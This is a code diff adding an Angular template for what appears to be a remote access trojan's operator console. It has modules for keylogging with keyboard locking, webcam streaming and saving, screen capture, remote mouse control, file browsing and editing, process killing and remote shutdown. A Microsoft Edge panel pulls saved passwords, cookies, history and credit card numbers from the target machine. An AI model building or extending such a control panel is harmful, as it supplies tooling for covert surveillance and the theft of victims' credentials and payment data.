@@ -1,0 +1,887 @@
+<div class="agent-console">
+
+  <!-- ================= HEADER ================= -->
+  <header class="agent-header">
+    <div class="agent-id">
+      <h1>{{ agent?.machineId }}</h1>
+      <p>Remote Agent Control Console</p>
+    </div>
+<div class="agent-controls">
+
+  <div
+  class="status-chip"
+  [class.online]="agent?.online"
+  [class.offline]="!agent?.online"
+>
+  ● {{ agent?.online ? 'ONLINE' : 'OFFLINE' }}
+</div>
+
+<div
+  class="status-chip ws"
+  [class.connected]="ws.status() === 'connected'"
+  [class.disconnected]="ws.status() !== 'connected'"
+>
+  WS: {{ ws.status() === 'connected' ? 'CONNECTED' : 'DISCONNECTED' }}
+</div>
+
+  <button
+  class="btn-connect"
+  [class.connected]="ws.status() === 'connected'"
+  [class.disconnected]="ws.status() !== 'connected'"
+  (click)="toggleWS()"
+  [disabled]="!agent?.online"
+>
+  {{ ws.status() === 'connected'
+      ? '🔌 CONNECTED'
+      : '🔌 CONNECT' }}
+</button>
+
+
+</div>
+
+  </header>
+
+  <!-- ================= BODY ================= -->
+  <div class="agent-body">
+
+    <!-- ===== SIDEBAR MODULES ===== -->
+    <aside class="module-sidebar">
+      <div
+        class="module-item"
+        *ngFor="let m of modules"
+        [class.active]="selectedModule() === m.key"
+        (click)="openModule(m.key)">
+        <span class="icon">{{ m.icon }}</span>
+        <span>{{ m.label }}</span>
+      </div>
+    </aside>
+
+    <!-- ===== MAIN WORKSPACE ===== -->
+    <main class="module-workspace">
+
+      <!-- EMPTY -->
+      <div *ngIf="!selectedModule()" class="module-empty">
+        <h2>Select a module</h2>
+        <p>Choose a module from the left panel to start controlling this agent.</p>
+      </div>
+
+      <!-- MODULE HEADER -->
+      <div *ngIf="selectedModule()" class="module-header">
+        <h2>{{ selectedModule() }}</h2>
+        <button class="btn back" (click)="backToModules()">← Back</button>
+      </div>
+
+      <!-- MODULE CONTENT -->
+      <div class="module-content"  [@moduleAnim]="selectedModule()">
+         <!-- ========== PROCESS MANAGER ========== -->
+<div *ngIf="selectedModule() === 'PROCESSES'" class="section-card process">
+
+
+  <!-- HEADER -->
+  <div class="module-top">
+    <h3>🔧 Process Manager</h3>
+    <!-- <button class="btn-back" (click)="backToModules()">← Modules</button> -->
+  </div>
+
+  <!-- COMMAND PANEL -->
+  <div class="command-panel">
+
+    <div class="command">
+      <button class="cmd-btn" (click)="sendProcessList()">📋 LIST</button>
+      <span class="cmd-hint">Load all running processes</span>
+    </div>
+
+    <div class="command danger">
+      <input type="number" placeholder="PID…" [(ngModel)]="killPid"(keyup.enter)="killProcess(killPid)">
+      <button class="cmd-btn danger" (click)="killProcess(killPid)">🗑 KILL</button>
+    </div>
+
+    <div class="command">
+      <input type="text" placeholder="process.exe" [(ngModel)]="startExeName"(keyup.enter)="startProcess()">
+      <button class="cmd-btn" (click)="startProcess()">➕ START</button>
+    </div>
+
+  </div>
+
+  <!-- DATA PANEL -->
+  <div class="data-panel">
+    <table *ngIf="processList().length">
+      <thead>
+        <tr>
+          <th>PID</th>
+          <th>Process</th>
+          <th>Threads</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr *ngFor="let p of processList()">
+          <td>{{ p.pid }}</td>
+          <td>{{ p.exe || p.name }}</td>
+          <td>{{ p.count || p.threads }}</td>
+          <td>
+            <button class="table-kill" (click)="killProcess(p.pid)">KILL</button>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div *ngIf="!processList().length" class="placeholder">
+      No data loaded. Click <b>LIST</b> to fetch processes.
+    </div>
+  </div>
+
+</div>
+<!-- ========== APP MANAGER ========== -->
+<div *ngIf="selectedModule() === 'APPLICATIONS'" class="section-card app">
+
+
+
+  <div class="module-top">
+    <h3>📁 Application Manager</h3>
+    <!-- <button class="btn-back" (click)="backToModules()">← Modules</button> -->
+  </div>
+
+  <!-- COMMAND PANEL -->
+  <div class="command-panel">
+
+    <div class="command">
+      <button class="cmd-btn" (click)="sendAppList()">📋 LIST</button>
+      <span class="cmd-hint">Load running applications</span>
+    </div>
+
+    <div class="command danger">
+      <input type="text" placeholder="app.exe" [(ngModel)]="killExeName" (keyup.enter)="killApp(killExeName)">
+      <button class="cmd-btn danger" (click)="killApp(killExeName)">🗑 KILL</button>
+    </div>
+
+    <div class="command">
+      <input type="text" placeholder="app.exe" [(ngModel)]="startExeName" (keyup.enter)="sendAppStart()" >
+      <button class="cmd-btn" (click)="sendAppStart()">➕ START</button>
+    </div>
+
+  </div>
+
+  <!-- DATA PANEL -->
+  <div class="data-panel">
+    <table *ngIf="appList().length">
+      <thead>
+        <tr>
+          <th>Executable</th>
+          <th>Process Count</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr *ngFor="let app of appList()">
+          <td>{{ app.exe }}</td>
+          <td>{{ app.count }}</td>
+          <td>
+            <button class="table-kill" (click)="killAppAll(app.exe)">KILL ALL</button>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div *ngIf="!appList().length" class="placeholder">
+      Click <b>LIST</b> to load applications.
+    </div>
+  </div>
+
+</div>
+<!-- ========== SCREEN MODULE ========== -->
+<div *ngIf="selectedModule() === 'SCREEN'" class="section-card screen-module">
+
+  <div class="module-header">
+    <h3>🖼 SCREEN CAPTURE</h3>
+    <div class="module-actions">
+      <button class="cmd-btn"  [class.loading]="screenBusy"(click)="sendScreenCaptureBinary()">📷 CAPTURE</button>
+      <button class="cmd-btn ghost"[disabled]="screenBusy" (click)="clearScreenshot()">CLEAR</button>
+    </div>
+  </div>
+
+  <div class="screen-stage">
+    <ng-container *ngIf="screenshot() as shot; else noScreen">
+      <img [src]="shot" class="screen-image" />
+    </ng-container>
+
+    <ng-template #noScreen>
+      <div class="empty-state">
+        <div class="empty-title">NO SCREENSHOT</div>
+        <div class="empty-sub">Click CAPTURE to grab remote screen</div>
+      </div>
+    </ng-template>
+  </div>
+
+</div>
+
+<!-- ========== WEBCAM MODULE ========== -->
+<div *ngIf="selectedModule() === 'WEBCAM'" class="section-card webcam-module">
+
+  <div class="module-header">
+    <h3>📷 WEBCAM STREAM</h3>
+
+    <div class="module-actions">
+
+      <!-- START -->
+      <button
+        class="cmd-btn"
+        [disabled]="webcamBusy || isRecording"
+        (click)="sendWebcamStartStream()">
+        ▶ START
+      </button>
+
+      <!-- STOP -->
+      <button
+        class="cmd-btn danger"
+        [disabled]="!isRecording"
+        (click)="sendWebcamStop()">
+        ⏹ STOP
+      </button>
+
+      <!-- SAVE TOGGLE -->
+      <button
+        class="save-btn"
+        [class.danger]="saveEnabled"
+        (click)="saveEnabled = !saveEnabled">
+        💾 SAVE
+      </button>
+
+      <!-- TIME INPUT -->
+     <div class="time-input">
+  <span class="time-label">AUTO STOP  ⏱</span>
+
+  <div class="time-fields">
+    <input type="number" min="0" placeholder="HH" [(ngModel)]="stopHour">
+    <span>:</span>
+    <input type="number" min="0" placeholder="MM" [(ngModel)]="stopMinute">
+    <span>:</span>
+    <input type="number" min="0" placeholder="SS" [(ngModel)]="stopSecond">
+  </div>
+</div>
+<!-- <div class="time-chip">
+  ⏱
+  <input type="number" min="0" placeholder="HH" [(ngModel)]="stopHour">
+  :
+  <input type="number" min="0" placeholder="MM" [(ngModel)]="stopMinute">
+  :
+  <input type="number" min="0" placeholder="SS" [(ngModel)]="stopSecond">
+</div> -->
+
+
+    </div>
+  </div>
+
+  <div class="webcam-stage">
+    <img
+      *ngIf="ws.webcamFrameUrl() as frame"
+      [src]="frame"
+      class="webcam-image"
+    />
+
+    <div *ngIf="!ws.webcamFrameUrl()" class="empty-state">
+      <div class="empty-title">WEBCAM OFFLINE</div>
+      <div class="empty-sub">Start stream to view camera</div>
+    </div>
+  </div>
+
+  <canvas #webcamCanvas hidden></canvas>
+</div>
+
+<!-- ========== EXPLORER MODULE ========== -->
+<div *ngIf="selectedModule() === 'EXPLORER'" class="section-card explorer-module">
+
+  <!-- HEADER -->
+  <div class="explorer-header">
+    <div class="explorer-title">
+      📁 FILE EXPLORER
+    </div>
+
+    <div class="explorer-actions">
+      <button class="exp-btn" (click)="explorerGoRoot()">💽 ROOT</button>
+      <button class="exp-btn" (click)="explorerRefresh()">🔄 REFRESH</button>
+      <button class="exp-btn ghost" (click)="explorerBack()">⬅</button>
+    </div>
+  </div>
+
+  <!-- PATH BAR -->
+  <div class="explorer-path"  [class.path-active]="currentExplorerPath() && currentExplorerPath() !== 'ROOT'">
+    <span>PATH</span>
+    <code>{{ currentExplorerPath() || 'ROOT' }}</code>
+  </div>
+
+  <!-- GRID -->
+  <div class="explorer-grid" *ngIf="explorerItems().length">
+    <div
+      class="explorer-item"
+      *ngFor="let item of explorerItems()"
+      (dblclick)="onExplorerItemDblClick(item)"
+    >
+      <div class="item-icon">
+        {{ getExplorerIcon(item) }}
+      </div>
+
+      <div class="item-name" title="{{ item.name }}">
+        {{ item.name }}
+         <!-- EDITABLE BADGE -->
+    <span
+      *ngIf="isEditableFile(item)"
+      class="editable-badge"
+      title="Editable file (double click to open)"
+    >
+      ✏️ 
+    </span>
+      </div>
+    </div>
+  </div>
+
+  <!-- EMPTY -->
+  <div *ngIf="!explorerItems().length" class="explorer-empty">
+    <div class="empty-icon">📂</div>
+    <div class="empty-text">
+      Click <b>ROOT</b> to load file system
+    </div>
+  </div>
+
+</div>
+
+<!-- ================= FILE EDITOR MODAL ================= -->
+<div class="editor-backdrop" *ngIf="editorOpen()" (click)="closeEditor()"></div>
+
+<div class="editor-modal" *ngIf="editorOpen()">
+
+  <div class="editor-header" [class.saved]="editorSavedFlash">
+    <div class="editor-title">
+      ✏️ Editing: {{ editorPath() }}
+      <span class="editor-hint">(Ctrl+S: save, Esc: out)</span>
+    </div>
+
+    <div class="editor-buttons">
+      <button class="editor-save" (click)="saveEditorFile()">💾 Save</button>
+      <button class="editor-close" (click)="closeEditor()">✖ Close</button>
+    </div>
+  </div>
+
+  <textarea
+    class="editor-textarea"
+    [value]="editorContent()"
+    (input)="updateEditorText($event)"
+    spellcheck="false"
+  ></textarea>
+
+</div>
+
+<!-- ========== KEYLOGGER MODULE ========== -->
+<div *ngIf="selectedModule() === 'KEYLOGGER'" class="section-card keylogger-module">
+
+  <!-- HEADER -->
+  <div class="module-header">
+    <h3>⌨ KEYLOGGER</h3>
+
+    <div class="module-actions">
+      <button class="cmd-btn green"
+               [disabled]="keyloggerRunning()"
+              [class.active]="keyloggerRunning()"
+              (click)="sendKeyloggerStart()">
+        ▶ START
+      </button>
+
+      <button class="cmd-btn danger"
+              [disabled]="!keyloggerRunning()"
+              [class.active]="!keyloggerRunning()"
+              (click)="sendKeyloggerStop()">
+        ■ STOP
+      </button>
+
+     
+
+      <button class="cmd-btn"
+              [disabled]="!keyloggerLocked()"
+              [class.active]="!keyloggerLocked()"
+              (click)="sendKeyloggerUnlock()">
+        🔓 UNLOCK
+      </button>
+       <button class="cmd-btn danger"
+              [disabled]="keyloggerLocked()"
+              [class.active]="keyloggerLocked()"
+              (click)="sendKeyloggerLock()">
+        🔒 LOCK
+      </button>
+
+      <button class="cmd-btn ghost" (click)="clearKeylogs()">🧹 CLEAR</button>
+    </div>
+  </div>
+
+  <!-- STATUS BAR -->
+  <div class="keylogger-status">
+    <span>
+      RECORDING:
+      <b [class.on]="keyloggerRunning()" [class.off]="!keyloggerRunning()">
+        {{ keyloggerRunning() ? 'ON' : 'OFF' }}
+      </b>
+    </span>
+
+    <span>
+      KEYBOARD:
+      <b [class.lock]="keyloggerLocked()" [class.unlock]="!keyloggerLocked()">
+        {{ keyloggerLocked() ? 'LOCKED' : 'UNLOCKED' }}
+      </b>
+    </span>
+
+    <span>LOGS: {{ ws.keylogList().length }}</span>
+  </div>
+
+  <!-- LOG OUTPUT -->
+  <div class="keylog-panel">
+    <pre *ngIf="ws.keylogList().length; else noLog" class="keylog-text">
+{{ keylogText }}
+    </pre>
+
+    <ng-template #noLog>
+      <div class="empty-state">
+        <div class="empty-title">NO KEYSTROKES</div>
+        <div class="empty-sub">Press START to capture input</div>
+      </div>
+    </ng-template>
+  </div>
+
+</div>
+<!-- ========== GALLERY MODULE ========== -->
+<div *ngIf="selectedModule() === 'GALLERY'" class="section-card gallery-module">
+
+  <!-- HEADER -->
+  <div class="module-header">
+    <h3>🎞 MEDIA GALLERY</h3>
+
+    <div class="module-actions">
+      <button class="cmd-btn" (click)="reloadGallery()">🔄 RELOAD</button>
+      
+    </div>
+  </div>
+
+  <div class="gallery-layout">
+
+    <!-- LEFT: MEDIA LIST -->
+    <div class="gallery-list">
+
+      <div *ngIf="!ws.galleryItems().length" class="empty-state">
+        <div class="empty-title">NO MEDIA</div>
+        <div class="empty-sub">Stream & save video or screenshots first</div>
+      </div>
+
+      <div
+        class="media-item"
+        *ngFor="let g of ws.galleryItems()"
+        (click)="openGalleryItem(g)"
+        [class.active]="ws.viewingFile()?.name === g.name"
+      >
+        <div class="media-icon">
+          {{ isVideo(g.name) ? '🎬' : '🖼️' }}
+        </div>
+
+        <div class="media-info">
+          <div class="media-name">{{ g.name }}</div>
+          <div class="media-size">
+            {{ g.size ? (g.size / 1024 | number:'1.1-1') + ' KB' : '' }}
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT: PREVIEW -->
+    <div class="gallery-preview">
+
+      <ng-container *ngIf="ws.viewingFile() as file; else noPreview">
+
+        <div class="preview-header">
+          <span>▶ PREVIEW</span>
+          <span class="preview-name">{{ file.name }}</span>
+        </div>
+
+        <!-- VIDEO -->
+        <video
+          *ngIf="isVideo(file.name)"
+          [src]="ws.mediaUrl()"
+          controls
+          autoplay
+          class="preview-media"
+        ></video>
+
+        <!-- IMAGE -->
+        <img
+          *ngIf="isImage(file.name)"
+          [src]="ws.mediaUrl()"
+          class="preview-media"
+        />
+
+      </ng-container>
+
+      <ng-template #noPreview>
+        <div class="empty-preview">
+          <div class="empty-title">NO SELECTION</div>
+          <div class="empty-sub">Click a media file to preview</div>
+        </div>
+      </ng-template>
+
+    </div>
+
+  </div>
+</div>
+<!-- ========== REMOTE CONTROL ========== -->
+<div *ngIf="selectedModule() === 'REMOTE'" class="section-card remote-module">
+
+  <!-- HEADER -->
+  <div class="remote-header">
+    <div class="remote-title">
+      🎮 REMOTE CONTROL
+      <span class="remote-status"
+            [class.active]="remoteActive()">
+        {{ remoteActive() ? 'LIVE' : 'OFFLINE' }}
+      </span>
+    </div>
+
+    <div class="remote-actions">
+      <button class="remote-btn"
+              [class.danger]="remoteActive()"
+              (click)="toggleRemote()">
+        {{ remoteActive() ? '⏹ STOP' : '▶ START' }}
+      </button>
+    </div>
+  </div>
+
+  <!-- SCREEN AREA -->
+  <div class="remote-screen-wrapper">
+
+    <ng-container *ngIf="screenshot() as shot; else noRemoteShot">
+      <div class="remote-screen-frame">
+        <img
+          [src]="shot"
+          alt="Remote Screen"
+          (mousemove)="onRemoteMouseMove($event)"
+          (mousedown)="onRemoteMouseDown($event)"
+          (mouseup)="onRemoteMouseUp($event)"
+          (wheel)="onRemoteWheel($event)"
+          (contextmenu)="onRemoteContextMenu($event)"
+        />
+
+        <!-- OVERLAY -->
+        <div class="remote-overlay">
+          LIVE STREAM
+        </div>
+      </div>
+    </ng-container>
+
+    <ng-template #noRemoteShot>
+      <div class="remote-placeholder">
+        <div class="icon">🖥</div>
+        <div class="text">Remote screen is not active</div>
+        <div class="sub">Click START to begin streaming</div>
+      </div>
+    </ng-template>
+
+  </div>
+</div>
+<!-- ========== SYSTEM CONTROL ========== -->
+<div *ngIf="selectedModule() === 'SYSTEM'" class="section-card system-module">
+
+  <!-- HEADER -->
+  <div class="system-header">
+    <div class="system-title">
+      💻 SYSTEM CONTROL
+      <span class="system-badge">DANGER ZONE</span>
+    </div>
+
+    <div class="system-subtitle">
+      Critical actions affecting the remote machine
+    </div>
+  </div>
+
+  <!-- WARNING BOX -->
+  <div class="system-warning">
+    ⚠ These actions will immediately affect the remote system.<br>
+    Make sure you know what you are doing.
+  </div>
+
+  <!-- ACTIONS -->
+  <div class="system-actions">
+
+    <!-- SHUTDOWN -->
+    <div class="system-card danger">
+      <div class="card-icon">⏻</div>
+      <div class="card-content">
+        <div class="card-title">Shutdown</div>
+        <div class="card-desc">
+          Power off the remote machine immediately
+        </div>
+      </div>
+      <button class="system-btn danger"
+                (click)="openSystemConfirm('shutdown')">
+        EXECUTE
+      </button>
+    </div>
+
+    <!-- RESTART -->
+    <div class="system-card warning">
+      <div class="card-icon">🔄</div>
+      <div class="card-content">
+        <div class="card-title">Restart</div>
+        <div class="card-desc">
+          Reboot the remote machine
+        </div>
+      </div>
+      <button class="system-btn warning"
+              (click)="openSystemConfirm('restart')">
+        EXECUTE
+      </button>
+    </div>
+
+  </div>
+
+</div>
+<!-- ========== SYSTEM CONFIRM MODAL ========== -->
+<div class="editor-backdrop" *ngIf="systemConfirmOpen"
+     (click)="closeSystemConfirm()"></div>
+
+<div class="system-confirm-modal" *ngIf="systemConfirmOpen">
+
+  <div class="confirm-header danger">
+    ⚠ CONFIRM ACTION
+  </div>
+
+  <div class="confirm-body">
+    <p>
+      Are you sure you want to
+      <b>{{ systemConfirmAction === 'shutdown' ? 'SHUT DOWN' : 'RESTART' }}</b>
+      the remote machine?
+    </p>
+
+    <p class="confirm-warning">
+      This action cannot be undone.
+    </p>
+  </div>
+
+  <div class="confirm-actions">
+    <button class="system-btn ghost"
+            (click)="closeSystemConfirm()">
+      CANCEL
+    </button>
+
+    <button class="system-btn danger"
+            (click)="confirmSystemAction()">
+      CONFIRM
+    </button>
+  </div>
+
+</div>
+<!-- ========== EDGE MODULE ========== -->
+<div *ngIf="selectedModule() === 'EDGE'" class="section-card edge-module">
+
+  <div class="edge-header">
+    <h3>🌐 Microsoft Edge Data</h3>
+  </div>
+
+  <!-- EDGE ACTIONS -->
+  <div class="edge-actions">
+
+    <button class="edge-btn" (click)="sendEdgePasswords()">
+      🔐 Passwords
+      <span>Saved login credentials</span>
+    </button>
+
+    <button class="edge-btn" (click)="sendEdgeCookies()">
+      🍪 Cookies
+      <span>Browser cookies</span>
+    </button>
+
+    <button class="edge-btn" (click)="sendEdgeHistory()">
+      🕘 History
+      <span>Visited URLs</span>
+    </button>
+
+    <button class="edge-btn" (click)="sendEdgeBookmarks()">
+      ⭐ Bookmarks
+      <span>Saved bookmarks</span>
+    </button>
+
+    <button class="edge-btn danger" (click)="sendEdgeCreditCards()">
+      💳 Credit Cards
+      <span>Stored payment info</span>
+    </button>
+
+  </div>
+
+  <!-- RESULT -->
+  <div class="edge-result">
+
+    <div *ngIf="edgeLoading()" class="edge-loading">
+      Loading Edge data...
+    </div>
+
+    <!-- PASSWORDS -->
+    <div *ngIf="edgePasswords.length">
+
+      <!-- <div class="edge-section-header">
+        🔐 Passwords
+        <span class="edge-count">{{ edgePasswords.length }}</span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgePasswords" class="edge-item">
+          <div class="edge-icon">🔐</div>
+          <div>
+            <div class="edge-title">
+              {{ item.username }}
+              <span class="edge-badge">AES-GCM</span>
+            </div>
+            <div class="edge-sub">{{ item.url }}</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+   <!-- COOKIES (CARD STYLE – like Bookmarks) -->
+<div *ngIf="edgeCookies.length">
+
+  <!-- <div class="edge-section-header">
+    🍪 Cookies
+    <span class="edge-count">{{ edgeCookies.length }}</span>
+  </div> -->
+
+  <div class="edge-scroll">
+
+    <!-- DOMAIN CARD -->
+    <div *ngFor="let domain of edgeCookiesGrouped" class="edge-card">
+
+      <!-- CARD HEADER -->
+      <div class="edge-card-header">
+        <span class="edge-card-icon">🍪</span>
+        <span class="edge-card-title">{{ domain.domain }}</span>
+        <span class="edge-card-count">
+          {{ domain.cookies.length }}
+        </span>
+      </div>
+
+      <!-- CARD BODY -->
+      <div class="edge-card-body">
+
+        <!-- COOKIE NAME -->
+        <div *ngFor="let cookie of domain.cookies" class="edge-cookie-block">
+
+          <div class="edge-cookie-name">
+            {{ cookie.name }}
+          </div>
+
+          <!-- PATHS -->
+          <ng-container *ngFor="let item of cookie.paths">
+            <div
+              *ngIf="item.path && item.path !== '/'"
+              class="edge-cookie-path">
+              {{ item.path }}
+            </div>
+          </ng-container>
+
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+    <!-- HISTORY -->
+    <div *ngIf="edgeHistory.length">
+
+      <!-- <div class="edge-section-header">
+        🕘 History
+        <span class="edge-meta">
+          Last visit: {{ edgeHistory[0]?.url }}
+        </span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgeHistory" class="edge-item">
+          <div class="edge-icon">🕘</div>
+          <div>
+            <div class="edge-title">
+              {{ item.title || 'Visited page' }}
+            </div>
+            <div class="edge-sub">
+              {{ item.url }} · Visits: {{ item.visits }}
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- BOOKMARKS -->
+    <div *ngIf="edgeBookmarks.length">
+
+      <!-- <div class="edge-section-header">
+        ⭐ Bookmarks
+        <span class="edge-count">{{ edgeBookmarks.length }}</span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgeBookmarks" class="edge-item">
+          <div class="edge-icon">⭐</div>
+          <div>
+            <div class="edge-title">{{ item.name }}</div>
+            <div class="edge-sub">
+              {{ item.folder }} · {{ item.url }}
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- CREDIT CARDS -->
+    <div *ngIf="edgeCreditCards.length">
+
+      <!-- <div class="edge-section-header">
+        💳 Credit Cards
+        <span class="edge-count">{{ edgeCreditCards.length }}</span>
+      </div> -->
+
+      <div class="edge-scroll">
+        <div *ngFor="let item of edgeCreditCards" class="edge-item">
+          <div class="edge-icon">💳</div>
+          <div>
+            <div class="edge-title">
+              {{ item.name }}
+              <span class="edge-badge danger">AES-GCM</span>
+            </div>
+            <div class="edge-sub">
+              {{ item.number }} · Exp {{ item.exp_month }}/{{ item.exp_year }}
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div *ngIf="!edgeLoading() && edgeResult().length === 0" class="edge-empty">
+      Select a function to extract Edge data.
+    </div>
+
+  </div>
+
+</div>
+
+
+
+
+
+        <!-- Tất cả mấy khối PROCESS / APP / KEYLOGGER / SCREEN
+             bạn giữ NGUYÊN logic cũ, chỉ render trong đây -->
+      </div>
+
+    </main>
+
+  </div>
+</div>
